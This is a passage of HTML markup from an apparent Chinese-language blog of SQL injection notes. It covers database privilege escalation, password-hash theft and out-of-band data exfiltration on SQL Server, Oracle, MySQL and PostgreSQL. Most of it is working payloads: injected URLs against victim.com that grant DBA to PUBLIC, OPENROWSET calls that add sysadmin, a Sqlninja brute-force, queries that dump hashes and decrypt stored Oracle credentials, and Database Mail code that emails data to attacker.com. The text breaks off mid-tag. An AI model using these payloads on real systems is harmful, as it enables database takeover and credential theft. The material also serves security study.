language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">DECLARE</span> <span class=\"token variable\">@q</span> nvarchar<span class=\"token punctuation\">(</span><span class=\"token number\">999</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">SET</span> <span class=\"token variable\">@q</span> <span class=\"token operator\">=</span> N<span class=\"token string\">'SELECT 1 FROM OPENROWSET（\"SQLOLEDB\",\"Network=DBMSSOCN; Address=;uid=sa;pwd=password\",\"SELECT 1; EXEC master.dbo.sp_addsrvrolemember '</span>\"<span class=\"token string\">\"+system_user+\"\"',\"\"sysadmin\"</span>\"<span class=\"token punctuation\">)</span><span class=\"token string\">';\n\nEXEC master.dbo.xp_execresultset @q, N'</span>master'<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>只有目标SQL server启用了混合验证模式，sa才能工作，使用混合验证模式时，Windows用户和SQL Server用户（比如sa）均可通过数据库验证。如果远程数据库服务器上配置的只有Windows验证模式，那么此时只有Windows用户能够访问数据库，sa账户将不可用。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">-- 检测当前使用的哪种模式</span>\n<span class=\"token keyword\">select</span> serverproperty<span class=\"token punctuation\">(</span><span class=\"token string\">'IslntegratedSecurityOnly'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">-- 如果当前采用的只有Windows验证模式，那么该查询返回1，否则返回0</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>Sqlninja暴力破解命令</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">./sqlninj a <span class=\"token parameter variable\">-m</span> bruteforce <span class=\"token parameter variable\">-w</span> wordlist.txt\n./sqlninj a <span class=\"token parameter variable\">-m</span> fingerprint<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>OPENROWSET 还可用于寻找存在弱口令的SQL Server</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> <span class=\"token keyword\">OPENROWSET</span><span class=\"token punctuation\">(</span><span class=\"token string\">'SQLOLEDB'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Network=DBMSSOCN;\nAddress=10.0.0.1;uid=sa; pwd='</span><span class=\"token punctuation\">,</span><span class=\"token string\">'SELECT 1'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">-- 测试openrowset是否可用</span>\n<span class=\"token keyword\">select</span> value_in_use <span class=\"token keyword\">from</span> sys<span class=\"token punctuation\">.</span>configurations <span class=\"token keyword\">where</span> name <span class=\"token operator\">LIKE</span> <span class=\"token string\">'Ad Hoc%'</span> \n<span class=\"token comment\">-- 如果OPENROWSET可用，该查询将返回1，否则将返回0。 </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"在未打补丁的服务器上提升权限\"><a href=\"#在未打补丁的服务器上提升权限\" class=\"headerlink\" title=\"在未打补丁的服务器上提升权限\"></a>在未打补丁的服务器上提升权限</h4><p>如果目标数据库服务器没有更新最新的安全补丁，它就可能会受到一种或多种很有名的攻击。</p>\n<p>例子：CVE-2010-0232漏洞</p>\n<p>Sqlninja中包含了一个利用该原始漏洞的定制版本的工具。当以sql作为参数来调用该工具时， 它将寻找SQLSERVR.EXE进程并将该进程的权限提升为SYSTEM。为了执行这种攻击，需要 执行下面几个步骤：</p>\n<ul>\n<li><p>使用 fingerprint 模式(-m fingerprint)检查 xp cmdshell 是否可用(option 3),以及 SQLSERVR. EXE并未以SYSTEM权限运行(option 5)。</p>\n</li>\n<li><p>使用 upload 模式(-m upload)将 vdmallowed.exe(option 5)和 vdmexploit.dll(叩tion 6)传送到远程服务器。</p>\n</li>\n<li><p>使用 command 模式(-m command)运行 ‘<code>％TEMP%\\\\vdmallowed.exe sql</code>， 以执行该漏洞利用工具。</p>\n</li>\n</ul>\n<p>如果远程Windows服务器没有打上针对这一漏洞的补丁，此时fingerprint模式将确认SQL Server真正运行在SYSTEM权限之下。</p>\n<h5 id=\"Oracle-1\"><a href=\"#Oracle-1\" class=\"headerlink\" title=\"Oracle\"></a>Oracle</h5><p>如果我们可以访问<code>dbms_xmlquery.newcontext()</code>或<code>dbms_xmlquery.getxml()</code>(默认对于PUBLIC权限可访问)，就可以通过匿名PL/SQL代码块执行注入</p>\n<p>不需要PL/SQL注入的一个例子是：使用在Oracle的mod_plsql组件中发现的一个漏洞。 下列URL展示了一种通过driload包提升权限的方法。这个包未被mod_plsql组件过滤，所有Web用户均可通过输入下列URL来提升权限：</p>\n<p><a href=\"http://www.victim.com/pls/dad/ctxsys.driload.validate_stmt?sqlstmt=GRANT+DBA+TO+PUBLIC\">http://www.victim.com/pls/dad/ctxsys.driload.validate_stmt?sqlstmt=GRANT+DBA+TO+PUBLIC</a></p>\n<p>在利用大多数权限提升漏洞时使用了下列概念：</p>\n<ol>\n<li>创建一个将DBA权限授权给公共角色的有效载荷。这比将DBA权限授权给指定的用户更隐蔽些。下一步将把该有效载荷注入一个易受攻击的PL/SQL存储过程中。</li>\n</ol>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token operator\">OR</span> <span class=\"token keyword\">REPLACE</span> <span class=\"token keyword\">FUNCTION</span> F1 <span class=\"token keyword\">return</span> number\nauthid <span class=\"token keyword\">current_user</span> <span class=\"token keyword\">as</span>\npragma autonomous_transaction<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">BEGIN</span>\n<span class=\"token keyword\">EXECUTE</span> IMMEDIATE <span class=\"token string\">'GRANT DBA TO PUBLIC'</span>；\n<span class=\"token keyword\">COMMIT</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">RETURN</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">END</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">/</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ol start=\"2\">\n<li>将该有效载荷注入一个易受攻击的包中：</li>\n</ol>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">exec</span> sys<span class=\"token punctuation\">.</span>kupw$WORKER<span class=\"token punctuation\">.</span>main<span class=\"token punctuation\">(</span><span class=\"token string\">'x'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'YY'' and 1=user12.f1 -- mytagl2'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ol start=\"3\">\n<li>启用DBA角色：</li>\n</ol>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">set</span> role DBA<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ol start=\"4\">\n<li>从公共角色中撤销DBA角色：</li>\n</ol>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">revoke</span> DBA <span class=\"token keyword\">from</span> <span class=\"token keyword\">PUBLIC</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>当前会话虽然仍然拥有DBA权限，但却不再出现在Oracle的权限表中。</p>\n<h5 id=\"SYS-LT\"><a href=\"#SYS-LT\" class=\"headerlink\" title=\"SYS.LT\"></a>SYS.LT</h5><p>如果数据库用户具有CREATE PROCEDURE权限，我们就可以在该用户的模式(schema) 中创建一个恶意函数，并在SYS.LT包的一个容易遭受攻击的对象中注入该函数(2009年4月 Oracle已经修正了这一问题)。这一攻击的结果，就是我们的恶意函数在SYS许可权限下获得 执行，并且我们获得了 DBA权限。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">-- 创建函数</span>\nhttp:<span class=\"token comment\">//www.victim.com/inciex.jsp?id=1 and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate \"create or replace function pwn2 return varchar2 authid current_user is PRAGMA autonomous_transaction;BEGIN execute immediate \"\"grant dba to public\"\";commit;return \"\",1\"\";END;''; commit; end;') from dual) is not null -- </span>\n\n<span class=\"token comment\">-- 利用 SYS.LT</span>\nhttp:<span class=\"token comment\">//www.victim.com/index.jsp?id=l and (select dbms_xmlquery. newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate \"begin SYS.LT.CREATEWORKSPACE(\"\"A10\"\"\"\"\" and scott.pwn2()=\"\"\"\"x\"\");SYS.LT.REMOVEWORKSPACE(\"\"A10\"\"\"\" and scott.pwn2()=\"\"\"\"x\"\");end;\";commit;end;') from dual) is not null -- </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"SYS-DBMS-CDC-PUBLISH\"><a href=\"#SYS-DBMS-CDC-PUBLISH\" class=\"headerlink\" title=\"SYS.DBMS_CDC_PUBLISH\"></a>SYS.DBMS_CDC_PUBLISH</h4><p>该问题在sys.dbms_cdc_publish.create_change_set包中，该漏洞允许一个具有execute catalog role权限的用户成为DBA</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//www.victim.com/index.jsp?id=1 and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate '' begin sys.dbms_cdc_publish.create_change_set(''''a'''',''''a'''',''''a''''''''||SCOTT.pwn2()||''''''''a'''',''''Y'''',sysdate,sysdate);end;'';commit; end;') from dual) is not null--</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h5 id=\"绕过-CREATE-PROCEDURE-权限\"><a href=\"#绕过-CREATE-PROCEDURE-权限\" class=\"headerlink\" title=\"绕过 CREATE PROCEDURE 权限\"></a>绕过 CREATE PROCEDURE 权限</h5><p>要求具有create procedure权限</p>\n<h5 id=\"cursor注入\"><a href=\"#cursor注入\" class=\"headerlink\" title=\"cursor注入\"></a>cursor注入</h5><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//www.victim.com/index.jsp?id=l and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate '' DECLARE D NUMBER;BEGIN D:= DBMS_SQL.OPEN_CURSOR; DBMS_SQL.PARSE(D,''''declare pragma autonomous_transaction; begin execute immediate ''''''''' grant dba to public'''''''';commit;end;'''',0);SYS.LT.CREATEWORKSPACE(''''a''''''' and dbms_sql.execute(''''||D||'''')=1--');SYS.LT.COMPRESSWORKSPACETREE(''''a'''''''' and dbms_sql.execute(''''||D||'''')=1--'''');end;''; commit; end;') from dual) is not null--</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h5 id=\"SYS-KUPP-PROC\"><a href=\"#SYS-KUPP-PROC\" class=\"headerlink\" title=\"SYS.KUPP$PROC\"></a>SYS.KUPP$PROC</h5><p>SYS.KUPPSPROC.CREATE MASTER PROCESS()函数是另外一个 Oracle 函数，它允许执行任意PL/SQL语句。只有具有DBA角色的用户才能执行该函数。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> dbms_xmlquery<span class=\"token punctuation\">.</span>newcontext<span class=\"token punctuation\">(</span><span class=\"token string\">' declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate '' begin sys.vulnproc(''''a''''''''||sys.kupp$proc.create_master_process(''''''''EXECUTE IMMEDIATE''''''''''''''''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE\n''''''''''''''''''''''''''''''''GR ANT DBA TO PUBLIC'''''''''''''''''''''''''''''''';END;'''''''''''''''''''''''''''''''';'''''''')||''''''''a'''');end; ''; commit; end;'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> dual<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h5 id=\"弱许可权限\"><a href=\"#弱许可权限\" class=\"headerlink\" title=\"弱许可权限\"></a>弱许可权限</h5><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">ANY</span> <span class=\"token keyword\">VIEW</span>\n<span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">ANY</span> <span class=\"token keyword\">TRIGGER</span>\n<span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">ANY</span> <span class=\"token keyword\">PROCEDURE</span>\n<span class=\"token keyword\">EXECUTE</span> <span class=\"token keyword\">ANY</span> <span class=\"token keyword\">PROCEDURE</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这些权限间接地允许权限提升攻击。</p>\n<p>使用<code>CREATE ANY TRIGGER</code>提升权限</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> dbms_xmlquery<span class=\"token punctuation\">.</span>newcontext<span class=\"token punctuation\">(</span><span class=\"token string\">'declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate '' create or replace trigger \"SYSTEM\". the_trigger before insert on system.OL$ for each row declare pragma autonomous_transaction; BEGIN execute immediate ''''GRANT DBA TO PUBLIC''''; END the_trigger;'';end;'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> dual<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"窃取哈希口令\"><a href=\"#窃取哈希口令\" class=\"headerlink\" title=\"窃取哈希口令\"></a>窃取哈希口令</h3><h4 id=\"SQL-Server-2\"><a href=\"#SQL-Server-2\" class=\"headerlink\" title=\"SQL Server\"></a>SQL Server</h4><p>不同版本，差别很大，都需要管理员权限才能访问哈希口令表</p>\n<h5 id=\"SQL-Server-2000\"><a href=\"#SQL-Server-2000\" class=\"headerlink\" title=\"SQL Server 2000\"></a>SQL Server 2000</h5><p>哈希口令储存在master数据库的sysxlogins表中</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> name<span class=\"token punctuation\">,</span>password <span class=\"token keyword\">FROM</span> master<span class=\"token punctuation\">.</span>dbo<span class=\"token punctuation\">.</span>sysxlogins <span class=\"token comment\">-- 检索</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>由pwdencrypt()函数生成，哈希值由头，salt，区分大小写的哈希，不区分大小写的哈希组成</p>\n<h5 id=\"SQL-Server-2005-2008\"><a href=\"#SQL-Server-2005-2008\" class=\"headerlink\" title=\"SQL Server 2005,2008\"></a>SQL Server 2005,2008</h5><p>sysxlogins不存在了，移除了不区分大小写的哈希</p>\n<p>通过查询sql_logins视图检索哈希口令</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> password_hash <span class=\"token keyword\">FROM</span> sys<span class=\"token punctuation\">.</span>sql_logins<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>使用fh_varbintohexstr()函数将哈希值显式地强制转换为十六进制字符串</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//www.victim.com/products.asp?id=1+union+select+master.dbo.fn_varbintohexstr(password_hash)+from+sys.sql_logins+where+name+=+'sa'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"Mysql-1\"><a href=\"#Mysql-1\" class=\"headerlink\" title=\"Mysql\"></a>Mysql</h4><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">user</span><span class=\"token punctuation\">,</span>password <span class=\"token keyword\">FROM</span> mysql<span class=\"token punctuation\">.</span><span class=\"token keyword\">user</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">-- 检索哈希口令，哈希口令由password()函数产生，算法随版本</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h4 id=\"PostgreSQL-2\"><a href=\"#PostgreSQL-2\" class=\"headerlink\" title=\"PostgreSQL\"></a>PostgreSQL</h4><p>如果刚好具有administrative权限，就可以访问pg_shadow表</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> usename<span class=\"token punctuation\">,</span> passwd <span class=\"token keyword\">FROM</span> pg_shadow\n<span class=\"token keyword\">SELECT</span> rolname<span class=\"token punctuation\">,</span> rolpassword <span class=\"token keyword\">FROM</span> pg_authid<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">HASH</span> <span class=\"token operator\">=</span> <span class=\"token string\">'md5'</span> <span class=\"token operator\">||</span> MD5<span class=\"token punctuation\">(</span><span class=\"token string\">'foobar'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> md53858f62230ac3c915f300c664312c63f\n<span class=\"token comment\">-- foo是password，bar是username </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h4 id=\"Oracle-2\"><a href=\"#Oracle-2\" class=\"headerlink\" title=\"Oracle\"></a>Oracle</h4><p>Oracle在sys.user$表的password列存储数据库账户的哈希口令。dba_users视图指向该表，但从Oracle 11g开始，数据加密标准(Data Encryption Standard, DES)的哈希口令不再出现在 dba_user视图中。sys.user$表包含数据库用户(type#=1)和数据库角色(type#=0)的哈希口令。</p>\n<p>针对Oracle DES用户名口令：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">Select</span> username<span class=\"token punctuation\">,</span>password <span class=\"token keyword\">from</span> sys<span class=\"token punctuation\">.</span><span class=\"token keyword\">user</span>$ <span class=\"token keyword\">where</span> <span class=\"token keyword\">type</span><span class=\"token comment\">#&gt;0 andlength(password)=16</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>针对Oracle DES角色口令：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">Select</span> username<span class=\"token punctuation\">,</span>password <span class=\"token keyword\">from</span> sys<span class=\"token punctuation\">.</span><span class=\"token keyword\">user</span>$ <span class=\"token keyword\">where</span> <span class=\"token keyword\">type</span><span class=\"token comment\">#=1</span>\nandlength<span class=\"token punctuation\">(</span>password<span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token number\">16</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>针对 Oracle SHA1 口令(11g+)：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">Select</span> username<span class=\"token punctuation\">,</span>substr<span class=\"token punctuation\">(</span>spare4<span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">40</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">hash</span><span class=\"token punctuation\">,</span>substr<span class=\"token punctuation\">(</span>spare4<span class=\"token punctuation\">,</span><span class=\"token number\">43</span><span class=\"token punctuation\">,</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span> salt fromsys<span class=\"token punctuation\">.</span><span class=\"token keyword\">user</span>$ <span class=\"token keyword\">where</span> <span class=\"token keyword\">type</span><span class=\"token comment\">#&gt;0 and length(spare4)=62;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>sysman.mgmt_credentials2表是通常能找到的SYS用户明文口令的示例。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">-- get the cleartext password of the user MGMT_VIEW (generated by Oracle during the installation time, looks like a hash but is a password) </span>\n<span class=\"token keyword\">select</span> view_username<span class=\"token punctuation\">,</span> sysman<span class=\"token punctuation\">.</span>decrypt<span class=\"token punctuation\">(</span>view_password<span class=\"token punctuation\">)</span> Password <span class=\"token keyword\">from</span> sysman<span class=\"token punctuation\">.</span>mgmt_view_user_credentials<span class=\"token punctuation\">;</span>\n<span class=\"token comment\">-- get the password of the dbsnmp user, databases listener and OS credentials</span>\n<span class=\"token keyword\">select</span> sysman<span class=\"token punctuation\">.</span>decrypt<span class=\"token punctuation\">(</span>t1<span class=\"token punctuation\">.</span>credential_value<span class=\"token punctuation\">)</span> sysmanuser<span class=\"token punctuation\">,</span> sysman<span class=\"token punctuation\">.</span>decrypt<span class=\"token punctuation\">(</span>t2<span class=\"token punctuation\">.</span>credential_value<span class=\"token punctuation\">)</span> Password <span class=\"token keyword\">from</span> sysman<span class=\"token punctuation\">.</span>mgmt_credentials2 t1<span class=\"token punctuation\">,</span> sysman<span class=\"token punctuation\">.</span>mgmt_credentials2 t2 <span class=\"token keyword\">where</span> t1<span class=\"token punctuation\">.</span>credential_guid<span class=\"token operator\">=</span>t2<span class=\"token punctuation\">.</span>credential_guid\n<span class=\"token operator\">and</span> lower<span class=\"token punctuation\">(</span>t1<span class=\"token punctuation\">.</span>credential_set_column<span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">'username'</span>\n<span class=\"token operator\">and</span> lower<span class=\"token punctuation\">(</span>t2<span class=\"token punctuation\">.</span>credential_set_column<span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">'password'</span>\n<span class=\"token comment\">-- get the username and password of the Oracle Knowledgebase Metalink </span>\n<span class=\"token keyword\">select</span> sysman<span class=\"token punctuation\">.</span>decrypt<span class=\"token punctuation\">(</span>ARU_USERNAME<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>sysman<span class=\"token punctuation\">.</span>decrypt<span class=\"token punctuation\">(</span>ARU_PASSWORD<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> SYSMAN<span class=\"token punctuation\">.</span>MGMT_ARU_CREDENTIALS<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"Oracle组件\"><a href=\"#Oracle组件\" class=\"headerlink\" title=\"Oracle组件\"></a>Oracle组件</h5><ul>\n<li>APEX</li>\n<li>Oracle Internet Directory</li>\n</ul>\n<h3 id=\"带外通信\"><a href=\"#带外通信\" class=\"headerlink\" title=\"带外通信\"></a>带外通信</h3><p>用于发送请求的HTTP(S)连接被用于接收响应。不过也有例外的情况：可以通过完全不同的信道来传输结果。我们称这样的通信 为“带外”，或简称为OOB(Out Of Band)。</p>\n<h4 id=\"e-mail\"><a href=\"#e-mail\" class=\"headerlink\" title=\"e-mail\"></a>e-mail</h4><p>攻击者需要做的是构造一种利用，通过它来提取想要的信息，将数据打包到e-mail中并使用专门的数据库函数插入到e-mail队列中。之后该e-mail就会出现在攻击者的邮箱中。</p>\n<h5 id=\"MS-Server\"><a href=\"#MS-Server\" class=\"headerlink\" title=\"MS Server\"></a>MS Server</h5><p>SQL Mail（SQL Server 2000、2005 和 2008）和 Database Mail（SQL Server 2005 和 2008）</p>\n<ul>\n<li><p>SQL Mail</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">EXEC</span> master<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>xp_startmail<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">EXEC</span> master<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>xp_sendmail <span class=\"token variable\">@recipients</span> <span class=\"token operator\">=</span> <span class=\"token string\">'admin@attacker.com'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">@query</span> <span class=\"token operator\">=</span><span class=\"token string\">'select @@version'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n</li>\n<li><p>Database Mail</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">--Enable Database Mail</span>\n<span class=\"token keyword\">EXEC</span> sp_configure <span class=\"token string\">'show advanced'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">RECONFIGURE</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">EXEC</span> sp_configure <span class=\"token string\">'Database Mail XPs'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">RECONFIGURE</span>\n<span class=\"token comment\">-- Create a new account, MYACC. The SMTP server is provided in this call. </span>\n<span class=\"token keyword\">EXEC</span> msdb<span class=\"token punctuation\">.</span>dbo<span class=\"token punctuation\">.</span>sysmail_add_account_sp<span class=\"token variable\">@account_name</span><span class=\"token operator\">=</span><span class=\"token string\">'MYACC'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">@email_address</span><span class=\"token operator\">=</span><span class=\"token string\">'hacked@victim.com'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">@display_name</span><span class=\"token operator\">=</span><span class=\"token string\">'mls'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">@mailserver_name</span><span class=\"token operator\">=</span><span class=\"token string\">'smtp.victim.com'</span><span class=\"token punctuation\">,</span>\n<span class=\"token variable\">@account_id</span><span class=\"token operator\">=</span><span class=\"token boolean\">NULL</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">-- Create a new profile, MYPROFILE</span>\n<span class=\"token keyword\">EXEC</span> msdb<span class=\"token punctuation\">.</span>dbo<span class=\"token punctuation\">.</span>sysmail_adci_profile_sp<span class=\"token variable\">@profile_name</span><span class=\"token operator\">=</span> <span class=\"token string\">'MYPROFILE'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">@description</span><span class=\"token operator\">=</span><span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">@profile_id</span><span class=\"token operator\">=</span><span class=\"token boolean\">NULL</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">-- Bind the account to the profile</span>\n<span class=\"token keyword\">EXEC</span> msdb<span class=\"token punctuation\">.</span>dbo<span class=\"token punctuation\">.</span>sysmail_add_profileaccount_sp <span class=\"token variable\">@profile_name</span><span class=\"token operator\">=</span><span class=\"token string\">'MYPROFILE'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">@account_name</span><span class=\"token operator\">=</span><span class=\"token string\">'acc'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">@sequence_number</span><span class=\"token operator\">=</span><span class=\"token number\">1</span>\n<span class=\"token comment\">-- Retrieve login</span>\n<span class=\"token keyword\">DECLARE</span> <span class=\"token variable\">@b</span> <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">8000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token variable\">@b</span><span class=\"token operator\">=</span><span class=\"token keyword\">SYSTEM_USER</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">-- Send the mail</span>\n<span class=\"token keyword\">EXEC</span> msdb<span class=\"token punctuation\">.</span>dbo<span class=\"token punctuation\">.</span>sp_send_dbmail <span class=\"token variable\">@profile_name</span><span class=\"token operator\">=</span><span class=\"token string\">'MYPROFILE'</span><span class=\"token punctuation\">,</span>@\nrecipients<span class=\"token operator\">=</span><span class=\"token string\">'allyrbase@attacker.com'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">@subject</span><span class=\"token operator\">=</span><span class=\"token string\">' system user'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">@body</span><span class=\"token operator\">=</span><span class=\"token variable\">@b</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>\n</ul>\n<h5 id=\"Oracle-3\"><a href=\"#Oracle-3\" class=\"headerlink\" title=\"Oracle\"></a>Oracle</h5><p>UTL_SMTP提供了一系列函数来启动并管理一个SMTP连接：先使 用UTL_SMTP.OPEN_CONNECTION与服务器取得联系，之后使用UTL_SMTP.HELLO向服务器发送“HELLO”消息，接着分别使用UTL_SMTP.MAIL和UTL_SMTP.RCP指定发送者和接收者，接下来使用UTL_SMTP.DATA指定消息，最后使用UTL_SMTP.QUIT终止会话。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">UTL_MAIL<span class=\"token punctuation\">.</span>SEND<span class=\"token punctuation\">(</span>sender<span class=\"token 